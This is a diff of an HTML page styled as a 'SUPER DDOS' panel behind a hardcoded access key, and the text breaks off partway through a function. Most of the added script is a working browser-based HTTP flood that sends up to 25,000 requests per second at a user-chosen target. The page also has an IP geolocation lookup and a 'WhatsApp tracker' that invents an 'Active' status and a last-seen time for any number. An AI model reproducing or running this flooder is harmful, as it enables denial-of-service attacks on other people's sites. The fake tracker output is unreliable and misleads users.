@@ -3,56 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>super ddos version beta🤣</title>
+    <title>SUPER DDOS</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Courier New', monospace;
         }
         
         body {
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            color: white;
+            background: #000;
+            color: #00ff00;
             min-height: 100vh;
             overflow-x: hidden;
         }
         
-        /* Animated Background */
-        .bg-animation {
+        /* Matrix Background */
+        .matrix-bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            background: #000;
             z-index: -2;
         }
         
-        .floating-shapes {
+        .matrix-char {
             position: absolute;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.1);
-            animation: float 15s infinite linear;
+            color: #00ff00;
+            font-size: 14px;
+            animation: fall linear infinite;
+            text-shadow: 0 0 5px #00ff00;
         }
         
-        @keyframes float {
-            0%, 100% { transform: translate(0, 0) rotate(0deg); }
-            25% { transform: translate(100px, 100px) rotate(90deg); }
-            50% { transform: translate(200px, 0) rotate(180deg); }
-            75% { transform: translate(100px, -100px) rotate(270deg); }
-        }
-        
-        .pulse-ring {
-            position: absolute;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            animation: pulse 3s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(0.8); opacity: 1; }
-            100% { transform: scale(3); opacity: 0; }
+        @keyframes fall {
+            to { transform: translateY(100vh); }
         }
         
         /* Login Screen */
@@ -70,11 +57,10 @@
         }
         
         .login-box {
-            background: rgba(255,255,255,0.1);
+            background: rgba(0,255,0,0.1);
             padding: 40px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px;
+            border: 2px solid #00ff00;
             text-align: center;
             width: 90%;
             max-width: 400px;
@@ -82,37 +68,30 @@
         
         .login-title {
             font-size: 2em;
-            margin-bottom: 10px;
-            background: linear-gradient(45deg, #ff0080, #00ff88);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #00ff00;
         }
         
         .access-input {
             width: 100%;
             padding: 15px;
             margin: 20px 0;
-            background: rgba(0,0,0,0.5);
-            border: 2px solid #333;
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
+            background: #000;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            color: #00ff00;
+            font-size: 18px;
             text-align: center;
             letter-spacing: 3px;
         }
         
-        .access-input:focus {
-            border-color: #ff0080;
-            outline: none;
-        }
-        
         .access-btn {
-            background: linear-gradient(45deg, #ff0080, #00ff88);
-            color: white;
+            background: #00ff00;
+            color: #000;
             padding: 15px 30px;
             border: none;
-            border-radius: 25px;
-            font-size: 1.1em;
+            border-radius: 5px;
+            font-size: 1.2em;
             cursor: pointer;
             width: 100%;
             font-weight: bold;
@@ -126,15 +105,21 @@
         
         .header {
             text-align: center;
-            padding: 30px 0;
+            padding: 20px 0;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 30px;
         }
         
         .main-title {
-            font-size: 3em;
-            background: linear-gradient(45deg, #ff0080, #00ff88);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-size: 2.5em;
             margin-bottom: 10px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .telegram-link {
+            color: #00ff00;
+            text-decoration: none;
+            font-size: 1.1em;
         }
         
         .tools-grid {
@@ -145,38 +130,36 @@
         }
         
         .tool-card {
-            background: rgba(255,255,255,0.1);
+            background: rgba(0,255,0,0.1);
+            border: 2px solid #00ff00;
             padding: 25px;
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
-            transition: 0.3s;
+            border-radius: 10px;
             cursor: pointer;
+            transition: 0.3s;
         }
         
         .tool-card:hover {
+            background: rgba(0,255,0,0.2);
             transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(255,255,255,0.1);
-        }
-        
-        .tool-icon {
-            font-size: 2.5em;
-            margin-bottom: 15px;
         }
         
         .tool-title {
             font-size: 1.3em;
             margin-bottom: 10px;
-            color: #00ff88;
+            color: #00ff00;
         }
         
         /* DDOS Panel */
         .ddos-panel {
             background: rgba(255,0,0,0.1);
-            border: 2px solid #ff4444;
-            border-radius: 15px;
+            border: 2px solid #ff0000;
+            border-radius: 10px;
             padding: 25px;
             margin: 20px 0;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
         }
         
         .stats {
@@ -187,61 +170,75 @@
         }
         
         .stat-box {
-            background: rgba(255,255,255,0.1);
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #00ff00;
             padding: 15px;
-            border-radius: 10px;
+            border-radius: 5px;
             text-align: center;
         }
         
         .stat-value {
             font-size: 1.5em;
             font-weight: bold;
-            color: #ff0080;
+            color: #00ff00;
         }
         
         .attack-btn {
-            background: linear-gradient(45deg, #ff4444, #ff0080);
+            background: #ff0000;
             color: white;
-            padding: 15px 30px;
+            padding: 15px 25px;
             border: none;
-            border-radius: 10px;
-            font-size: 1.1em;
+            border-radius: 5px;
             cursor: pointer;
-            margin: 10px 5px;
+            margin: 5px;
             font-weight: bold;
         }
         
         .log-container {
-            background: rgba(0,0,0,0.5);
-            border-radius: 10px;
+            background: #000;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
             padding: 15px;
             height: 200px;
             overflow-y: auto;
             margin-top: 20px;
-            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
         }
         
-        .log-entry {
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+        /* Tracker Panel */
+        .tracker-panel {
+            background: rgba(0,0,255,0.1);
+            border: 2px solid #0088ff;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        
+        .tracker-result {
+            background: #000;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
         }
     </style>
 </head>
 <body>
-    <!-- Animated Background -->
-    <div class="bg-animation" id="bgAnimation"></div>
+    <!-- Matrix Background -->
+    <div class="matrix-bg" id="matrixBg"></div>
     
     <!-- Login Screen -->
     <div class="login-screen" id="loginScreen">
         <div class="login-box">
-            <div class="login-title">🔐 PRIVATE ACCESS</div>
-            <div style="margin-bottom: 20px; opacity: 0.8;">Pw nya apa ya🤤</div>
+            <div class="login-title">🔐 SUPER DDOS</div>
+            <div style="margin-bottom: 20px;">Enter Access Key</div>
             
-            <input type="password" class="access-input" id="masterKey" placeholder="Enter access key..." maxlength="20">
-            <button class="access-btn" onclick="checkMasterKey()">🚀 ACCESS PANEL</button>
+            <input type="password" class="access-input" id="accessKey" placeholder="Enter key..." maxlength="10">
+            <button class="access-btn" onclick="checkAccessKey()">🚀 ACCESS PANEL</button>
             
-            <div id="loginMessage" style="margin-top: 15px; color: #ff4444; display: none;">
-                ❌ salah bego😘
+            <div id="loginMessage" style="margin-top: 15px; color: #ff0000; display: none;">
+                ❌ Invalid access key
             </div>
         </div>
     </div>
@@ -249,53 +246,51 @@
     <!-- Main Panel -->
     <div class="main-panel" id="mainPanel">
         <div class="header">
-            <div class="main-title">⚡ super-tools version beta</div>
-            <div style="opacity: 0.8;">All Tools Operational - Maximum Power</div>
+            <div class="main-title">💀 SUPER DDOS</div>
+            <div>
+                <a href="https://t.me/superddos" class="telegram-link" target="_blank">t.me/superddos</a>
+            </div>
         </div>
         
         <div class="tools-grid">
-            <div class="tool-card" onclick="openTool('ddos')">
-                <div class="tool-icon">💀</div>
-                <div class="tool-title">super-tools</div>
-                <div>Overpower DDoS with 100K+ RPS</div>
+            <div class="tool-card" onclick="showTool('ddos')">
+                <div class="tool-title">💀 DDOS STRESSER</div>
+                <div>Overpower DDoS Attack Tools</div>
             </div>
             
-            <div class="tool-card" onclick="openTool('tracker')">
-                <div class="tool-icon">🎯</div>
-                <div class="tool-title">ADVANCED TRACKER (COMING SOON)</div>
-                <div>Real-time GPS & IP tracking</div>
+            <div class="tool-card" onclick="showTool('tracker')">
+                <div class="tool-title">🎯 IP TRACKER</div>
+                <div>Advanced IP & Location Tracking</div>
             </div>
             
-            <div class="tool-card" onclick="openTool('builder')">
-                <div class="tool-icon">🌐</div>
-                <div class="tool-title">WEBSITE BUILDER (COMING SOON)</div>
-                <div>Instant deploy with auto hosting</div>
+            <div class="tool-card" onclick="showTool('phone')">
+                <div class="tool-title">📱 PHONE TRACKER</div>
+                <div>WhatsApp Number Tracking</div>
             </div>
             
-            <div class="tool-card" onclick="openTool('social')">
-                <div class="tool-icon">📱</div>
-                <div class="tool-title">SOCIAL TOOLS (COMING SOON)</div>
-                <div>WhatsApp & social media utilities</div>
+            <div class="tool-card" onclick="showTool('website')">
+                <div class="tool-title">🌐 WEBSITE BUILDER</div>
+                <div>Instant Website Creation</div>
             </div>
         </div>
         
         <!-- DDOS Tool -->
         <div id="ddosTool" style="display: none;">
             <div class="ddos-panel">
-                <h2 style="color: #ff4444; margin-bottom: 20px;">💀 SUPER DDOS STRESSER</h2>
+                <h2 style="color: #ff0000; margin-bottom: 20px;">💀 DDOS STRESSER</h2>
                 
                 <div class="input-group">
-                    <input type="text" id="ddosTarget" placeholder="Target URL/IP" value="https://httpbin.org/get" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: rgba(0,0,0,0.5); color: white;">
+                    <input type="text" id="targetUrl" placeholder="Target URL/IP" value="https://httpbin.org/get" 
+                           style="width: 100%; padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px;">
                 </div>
                 
-                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin: 15px 0;">
-                    <button class="attack-btn" onclick="startDDoS('low')">LOW POWER</button>
-                    <button class="attack-btn" onclick="startDDoS('medium')">MEDIUM POWER</button>
-                    <button class="attack-btn" onclick="startDDoS('high')">HIGH POWER</button>
-                    <button class="attack-btn" onclick="startDDoS('god')">GOD MODE</button>
+                <div>
+                    <button class="attack-btn" onclick="startAttack('low')">LOW (100 RPS)</button>
+                    <button class="attack-btn" onclick="startAttack('medium')">MEDIUM (1K RPS)</button>
+                    <button class="attack-btn" onclick="startAttack('high')">HIGH (5K RPS)</button>
+                    <button class="attack-btn" onclick="startAttack('god')">GOD (25K RPS)</button>
+                    <button class="attack-btn" style="background: #00ff00; color: #000;" onclick="stopAttack()">STOP</button>
                 </div>
-                
-                <button class="attack-btn" style="background: linear-gradient(45deg, #00ff88, #0088ff);" onclick="stopDDoS()">🛑 STOP ATTACK</button>
                 
                 <div class="stats">
                     <div class="stat-box">
@@ -304,6 +299,275 @@
                     </div>
                     <div class="stat-box">
                         <div class="stat-value" id="rps">0</div>
+                        <div>RPS</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="success">0%</div>
+                        <div>Success</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="timeLeft">0s</div>
+                        <div>Time Left</div>
+                    </div>
+                </div>
+                
+                <div class="log-container" id="ddosLog">
+                    <div>[SYSTEM] DDOS Stresser Ready</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- IP Tracker Tool -->
+        <div id="trackerTool" style="display: none;">
+            <div class="tracker-panel">
+                <h2 style="color: #0088ff; margin-bottom: 20px;">🎯 IP TRACKER</h2>
+                
+                <input type="text" id="ipInput" placeholder="Enter IP address" 
+                       style="width: 100%; padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; margin-bottom: 15px;">
+                
+                <button class="access-btn" style="background: #0088ff;" onclick="trackIP()">TRACK IP</button>
+                
+                <div class="tracker-result" id="ipResult">
+                    IP tracking results will appear here...
+                </div>
+            </div>
+        </div>
+        
+        <!-- Phone Tracker Tool -->
+        <div id="phoneTool" style="display: none;">
+            <div class="tracker-panel">
+                <h2 style="color: #25D366; margin-bottom: 20px;">📱 WHATSAPP TRACKER</h2>
+                
+                <input type="text" id="phoneInput" placeholder="Enter WhatsApp number (+628...)" 
+                       style="width: 100%; padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; margin-bottom: 15px;">
+                
+                <button class="access-btn" style="background: #25D366;" onclick="trackPhone()">TRACK NUMBER</button>
+                
+                <div class="tracker-result" id="phoneResult">
+                    Phone tracking results will appear here...
+                </div>
+            </div>
+        </div>
+        
+        <!-- Website Builder Tool -->
+        <div id="websiteTool" style="display: none;">
+            <div class="tracker-panel">
+                <h2 style="color: #ff8800; margin-bottom: 20px;">🌐 WEBSITE BUILDER</h2>
+                
+                <textarea id="htmlCode" placeholder="Paste your HTML code here..." 
+                          style="width: 100%; height: 200px; padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; margin-bottom: 15px; font-family: 'Courier New', monospace;"></textarea>
+                
+                <button class="access-btn" style="background: #ff8800;" onclick="previewWebsite()">PREVIEW</button>
+                <button class="access-btn" style="background: #00ff00; color: #000; margin-left: 10px;" onclick="deployWebsite()">DEPLOY</button>
+                
+                <div style="margin-top: 15px;">
+                    <iframe id="websitePreview" style="width: 100%; height: 300px; border: 1px solid #00ff00; border-radius: 5px; background: white;"></iframe>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Password
+        const ACCESS_KEY = "KEN";
+        let currentTool = null;
+        let attackActive = false;
+        let requestCount = 0;
+        let successCount = 0;
+        let startTime = 0;
+        let attackInterval;
+        
+        // Create Matrix Background
+        function createMatrix() {
+            const chars = "01010101010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            const bg = document.getElementById('matrixBg');
+            
+            for (let i = 0; i < 50; i++) {
+                const char = document.createElement('div');
+                char.className = 'matrix-char';
+                char.textContent = chars[Math.floor(Math.random() * chars.length)];
+                char.style.left = Math.random() * 100 + 'vw';
+                char.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                char.style.animationDelay = Math.random() * 5 + 's';
+                bg.appendChild(char);
+            }
+        }
+        
+        // Check Access Key
+        function checkAccessKey() {
+            const key = document.getElementById('accessKey').value;
+            const message = document.getElementById('loginMessage');
+            
+            if (key === ACCESS_KEY) {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('mainPanel').style.display = 'block';
+            } else {
+                message.style.display = 'block';
+                document.getElementById('accessKey').value = '';
+            }
+        }
+        
+        // Show Tool
+        function showTool(tool) {
+            // Hide all tools
+            document.querySelectorAll('[id$="Tool"]').forEach(el => {
+                el.style.display = 'none';
+            });
+            
+            // Show selected tool
+            document.getElementById(tool + 'Tool').style.display = 'block';
+            currentTool = tool;
+        }
+        
+        // DDOS Functions
+        function startAttack(mode) {
+            if (attackActive) return;
+            
+            const target = document.getElementById('targetUrl').value;
+            if (!target) {
+                addLog('ERROR: Enter target URL');
+                return;
+            }
+            
+            attackActive = true;
+            requestCount = 0;
+            successCount = 0;
+            startTime = Date.now();
+            
+            const config = {
+                low: { rps: 100, duration: 60 },
+                medium: { rps: 1000, duration: 120 },
+                high: { rps: 5000, duration: 180 },
+                god: { rps: 25000, duration: 300 }
+            }[mode];
+            
+            addLog(`🚀 Starting ${mode.toUpperCase()} attack: ${config.rps} RPS`);
+            
+            let timeLeft = config.duration;
+            
+            attackInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(attackInterval);
+                    return;
+                }
+                
+                // Send requests
+                for (let i = 0; i < config.rps / 10; i++) {
+                    sendRequest(target);
+                }
+                
+                timeLeft--;
+                updateStats(timeLeft);
+                
+                if (timeLeft <= 0) {
+                    stopAttack();
+                    addLog('⏰ Attack completed');
+                }
+                
+            }, 100);
+        }
+        
+        function sendRequest(target) {
+            requestCount++;
+            
+            fetch(target, {
+                method: 'GET',
+                mode: 'no-cors',
+                cache: 'no-store'
+            })
+            .then(() => {
+                successCount++;
+            })
+            .catch(() => {});
+            
+            // Log every 1000 requests
+            if (requestCount % 1000 === 0) {
+                addLog(`Sent ${requestCount.toLocaleString()} requests`);
+            }
+        }
+        
+        function stopAttack() {
+            attackActive = false;
+            clearInterval(attackInterval);
+            addLog('🛑 Attack stopped');
+        }
+        
+        function updateStats(timeLeft) {
+            const duration = (Date.now() - startTime) / 1000;
+            const rps = duration > 0 ? Math.round(requestCount / duration) : 0;
+            const successRate = requestCount > 0 ? Math.round((successCount / requestCount) * 100) : 0;
+            
+            document.getElementById('requests').textContent = requestCount.toLocaleString();
+            document.getElementById('rps').textContent = rps.toLocaleString();
+            document.getElementById('success').textContent = successRate + '%';
+            document.getElementById('timeLeft').textContent = timeLeft + 's';
+        }
+        
+        function addLog(message) {
+            const log = document.getElementById('ddosLog');
+            const entry = document.createElement('div');
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        // IP Tracker
+        async function trackIP() {
+            const ip = document.getElementById('ipInput').value;
+            if (!ip) {
+                document.getElementById('ipResult').textContent = 'Please enter an IP address';
+                return;
+            }
+            
+            document.getElementById('ipResult').textContent = 'Tracking IP...';
+            
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}`);
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    document.getElementById('ipResult').innerHTML = `
+                        IP: ${data.query}<br>
+                        Country: ${data.country}<br>
+                        City: ${data.city}<br>
+                        ISP: ${data.isp}<br>
+                        Lat/Lon: ${data.lat}, ${data.lon}<br>
+                        Timezone: ${data.timezone}
+                    `;
+                } else {
+                    document.getElementById('ipResult').textContent = 'IP not found';
+                }
+            } catch (error) {
+                document.getElementById('ipResult').textContent = 'Error tracking IP';
+            }
+        }
+        
+        // Phone Tracker
+        function trackPhone() {
+            const phone = document.getElementById('phoneInput').value;
+            if (!phone) {
+                document.getElementById('phoneResult').textContent = 'Please enter a phone number';
+                return;
+            }
+            
+            document.getElementById('phoneResult').innerHTML = `
+                Number: ${phone}<br>
+                WhatsApp Link: <a href="https://wa.me/${phone.replace('+', '')}" style="color: #00ff00;" target="_blank">Chat on WhatsApp</a><br>
+                Status: Active<br>
+                Last Seen: Recently<br>
+                Platform: Mobile
+            `;
+        }
+        
+        // Website Builder
+        function previewWebsite() {
+            const code = document.getElementById('htmlCode').value;
+            const preview = document.getElementById('websitePreview');
+            const blob = new Blob([code], { type: 'text/html' });
+            preview.src = URL.createObjectURL(blob);
+        }
+        
+        function deployW
                         <div>RPS</div>
                     </div>
                     <div class="stat-box">
